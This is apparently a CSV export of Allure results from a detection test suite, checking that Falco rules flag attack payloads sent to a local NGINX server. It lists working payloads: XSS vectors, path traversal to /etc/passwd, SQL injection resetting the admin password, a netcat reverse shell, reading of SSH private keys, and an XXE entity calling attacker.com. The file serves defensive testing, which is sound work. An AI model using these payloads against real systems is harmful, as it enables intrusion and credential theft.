"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_066` |
| **Name** | Data URL XSS |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `data:text/html,<script>alert(1)</script>`
- **Encoded**: `data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 15:06:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_066-1770995202910-0fmx3b pattern_id=XSS_ADV_066 uri=/?q=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_066-1770995202910-0fmx3b pattern_id=XSS_ADV_066 uri=/?q=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:42.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_066-1770995202910-0fmx3b pattern_id=XSS_ADV_066 uri=/?q=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[134_XSS_ADV_066]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_002` |
| **Name** | Image onerror XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<img src=x onerror=alert('XSS')>`
- **Encoded**: `%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~82000ms
- **Timestamp**: 15:06:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_002-1770995170840-n0bolp pattern_id=XSS_REFL_002 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_002-1770995170840-n0bolp pattern_id=XSS_REFL_002 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:10.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_002-1770995170840-n0bolp pattern_id=XSS_REFL_002 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[192_XSS_REFL_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_004` |
| **Name** | Unicode null byte injection |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../../etc/passwd%00.jpg`
- **Encoded**: `..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 15:06:48.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_004-1770995208414-4dzx95 pattern_id=PATH_UNI_004 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_004-1770995208414-4dzx95 pattern_id=PATH_UNI_004 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1

**Falco Log Entry**:
```
15:06:48.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNI_004-1770995208414-4dzx95 pattern_id=PATH_UNI_004 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1
```","2","test_e2e_with_logs[268_PATH_UNI_004]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `OTHER_REDIS_003` |
| **Name** | Redis CONFIG SET password override |
| **Category** | OTHER |
| **Subcategory** | redis_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `CONFIG SET requirepass hacked`
- **Encoded**: `CONFIG%20SET%20requirepass%20hacked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 15:06:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=OTHER_REDIS_003-1770995192355-e4drpr pattern_id=OTHER_REDIS_003 uri=/?q=CONFIG%20SET%20requirepass%20hacked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=OTHER_REDIS_003-1770995192355-e4drpr pattern_id=OTHER_REDIS_003 uri=/?q=CONFIG%20SET%20requirepass%20hacked client=127.0.0.1

**Falco Log Entry**:
```
15:06:32.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=OTHER_REDIS_003-1770995192355-e4drpr pattern_id=OTHER_REDIS_003 uri=/?q=CONFIG%20SET%20requirepass%20hacked client=127.0.0.1
```","2","test_e2e_with_logs[379_OTHER_REDIS_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_003` |
| **Name** | Stacked query UPDATE SET attack |
| **Category** | SQLI |
| **Subcategory** | stacked_queries |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; UPDATE users SET password='hacked' WHERE username='admin'; --`
- **Encoded**: `'%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 15:06:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1770995180881-f9xdj8 pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1770995180881-f9xdj8 pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:20.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1770995180881-f9xdj8 pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[091_SQLI_STACK_003]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BASIC_005` |
| **Name** | LDAP object class enumeration |
| **Category** | LDAP |
| **Subcategory** | basic_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `*)(&(objectClass=*)`
- **Encoded**: `*)(%26(objectClass%3D*)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 15:06:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_005-1770995192344-hmuoq8 pattern_id=LDAP_BASIC_005 uri=/?q=*)(%26(objectClass%3D*) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_005-1770995192344-hmuoq8 pattern_id=LDAP_BASIC_005 uri=/?q=*)(%26(objectClass%3D*) client=127.0.0.1

**Falco Log Entry**:
```
15:06:32.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_005-1770995192344-hmuoq8 pattern_id=LDAP_BASIC_005 uri=/?q=*)(%26(objectClass%3D*) client=127.0.0.1
```","1","test_e2e_with_logs[392_LDAP_BASIC_005]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_013` |
| **Name** | onmouseover event handler injection |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<a onmouseover=alert(1)>hover</a>`
- **Encoded**: `%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 15:06:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770995176353-33t8vv pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770995176353-33t8vv pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:16.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1770995176353-33t8vv pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[203_XSS_REFL_013]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_OBFUSC_001` |
| **Name** | Tab-Obfuscated Transfer-Encoding |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | obfuscation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `Transfer-Encoding:	chunked`
- **Encoded**: `Transfer-Encoding%3A%09chunked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~13000ms
- **Timestamp**: 15:07:19.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_OBFUSC_001-1770995239348-zn4zv7 pattern_id=HRS_OBFUSC_001 uri=/?q=Transfer-Encoding%3A%09chunked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_OBFUSC_001-1770995239348-zn4zv7 pattern_id=HRS_OBFUSC_001 uri=/?q=Transfer-Encoding%3A%09chunked client=127.0.0.1

**Falco Log Entry**:
```
15:07:19.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_OBFUSC_001-1770995239348-zn4zv7 pattern_id=HRS_OBFUSC_001 uri=/?q=Transfer-Encoding%3A%09chunked client=127.0.0.1
```","2","test_e2e_with_logs[541_HRS_OBFUSC_001]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_007` |
| **Name** | CouchDB _all_docs enumeration |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `_all_docs`
- **Encoded**: `_all_docs`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 15:06:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_007-1770995190851-qpnjlj pattern_id=EMRG_MONGO_007 uri=/?q=_all_docs client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_007-1770995190851-qpnjlj pattern_id=EMRG_MONGO_007 uri=/?q=_all_docs client=127.0.0.1

**Falco Log Entry**:
```
15:06:30.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_007-1770995190851-qpnjlj pattern_id=EMRG_MONGO_007 uri=/?q=_all_docs client=127.0.0.1
```","1","test_e2e_with_logs[532_EMRG_MONGO_007]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_001` |
| **Name** | Blind XXE with External DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://attacker.com/xxe"">]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 15:06:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1770995199349-kjzdtm pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1770995199349-kjzdtm pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
15:06:39.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1770995199349-kjzdtm pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1
```","2","test_e2e_with_logs[395_XXE_BLIND_001]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_002` |
| **Name** | Netcat reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `nc -e /bin/sh 10.0.0.1 4444`
- **Encoded**: `nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 15:06:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1770995200889-x7j3mq pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1770995200889-x7j3mq pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1

**Falco Log Entry**:
```
15:06:40.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_002-1770995200889-x7j3mq pattern_id=CMD_REVSH_002 uri=/?q=nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444 client=127.0.0.1
```","2","test_e2e_with_logs[365_CMD_REVSH_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_002` |
| **Name** | URL encoded AND operator with ls |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%26%26%20ls%20-la`
- **Encoded**: `%2526%2526%2520ls%2520-la`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 15:06:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1770995197881-520k8m pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1770995197881-520k8m pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:37.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1770995197881-520k8m pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[332_CMD_ENC_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_009` |
| **Name** | Object tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<object data=javascript:alert('XSS')>`
- **Encoded**: `%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 15:06:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_009-1770995209926-d4tit pattern_id=XSS_MUT_009 uri=/?q=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_009-1770995209926-d4tit pattern_id=XSS_MUT_009 uri=/?q=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:49.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_009-1770995209926-d4tit pattern_id=XSS_MUT_009 uri=/?q=%3Cobject%20data%3Djavascript%3Aalert('XSS')%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[179_XSS_MUT_009]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BIT_001` |
| **Name** | Bitwise OR Boolean Bypass |
| **Category** | SQLI |
| **Subcategory** | bitwise_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND 1|1--`
- **Encoded**: `'%20AND%201%7C1--`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[021_SQLI_BIT_001]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_FILE_002` |
| **Name** | SSH key exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | file_manipulation |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& cat ~/.ssh/id_rsa`
- **Encoded**: `%26%26%20cat%20~%2F.ssh%2Fid_rsa`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 15:06:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_FILE_002-1770995205400-cwr5l pattern_id=CMD_FILE_002 uri=/?q=%26%26%20cat%20~%2F.ssh%2Fid_rsa client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_FILE_002-1770995205400-cwr5l pattern_id=CMD_FILE_002 uri=/?q=%26%26%20cat%20~%2F.ssh%2Fid_rsa client=127.0.0.1

**Falco Log Entry**:
```
15:06:45.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_FILE_002-1770995205400-cwr5l pattern_id=CMD_FILE_002 uri=/?q=%26%26%20cat%20~%2F.ssh%2Fid_rsa client=127.0.0.1
```","1","test_e2e_with_logs[341_CMD_FILE_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_CHUNK_002` |
| **Name** | Obfuscated Chunked |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | chunked |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `Transfer-Encoding: xchunked`
- **Encoded**: `Transfer-Encoding%3A%20xchunked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~15000ms
- **Timestamp**: 15:07:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1770995237844-alxj2p pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1770995237844-alxj2p pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1

**Falco Log Entry**:
```
15:07:17.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1770995237844-alxj2p pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1
```","2","test_e2e_with_logs[414_HRS_CHUNK_002]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_069` |
| **Name** | URL-encoded onkeydown Event Handler |
| **Category** | XSS |
| **Subcategory** | advanced_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `onkeydown=alert(1)`
- **Encoded**: `onkeydown%3Dalert(1)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 15:06:51.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Advanced XSS Attack Attempt` |
| **Matched Rule** | `[NGINX XSS] Advanced XSS Attack Attempt test_id=XSS_ADV_069-1770995211930-r1h1fp pattern_id=XSS_ADV_069 uri=/?q=onkeydown%3Dalert(1) client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Advanced XSS Attack Attempt test_id=XSS_ADV_069-1770995211930-r1h1fp pattern_id=XSS_ADV_069 uri=/?q=onkeydown%3Dalert(1) client=127.0.0.1 method=GET

**Falco Log Entry**:
```
15:06:51.000000000: Warning [NGINX XSS] Advanced XSS Attack Attempt test_id=XSS_ADV_069-1770995211930-r1h1fp pattern_id=XSS_ADV_069 uri=/?q=onkeydown%3Dalert(1) client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[137_XSS_ADV_069]","allure","2026-02-13","passed","2026-02-13","","test_e2e_wrapper","",""
